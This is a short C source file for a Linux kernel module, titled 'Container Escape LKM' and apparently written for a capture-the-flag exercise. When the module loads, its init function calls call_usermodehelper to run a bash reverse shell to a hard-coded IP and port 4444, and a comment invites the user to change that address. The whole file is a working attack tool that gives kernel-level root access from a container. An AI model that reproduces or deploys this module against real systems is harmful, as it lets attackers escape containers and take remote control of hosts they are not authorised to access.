#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CTF");
MODULE_DESCRIPTION("Container Escape LKM");

// Define the path separately
static char* path = "/bin/bash";
static char* argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.48.85.203/4444 0>&1", NULL}; //change ip adn port
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

static int __init reverse_shell_init(void) {
    // Corrected signature: path, argv, envp, wait
    return call_usermodehelper(path, argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Cleaning up\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);   
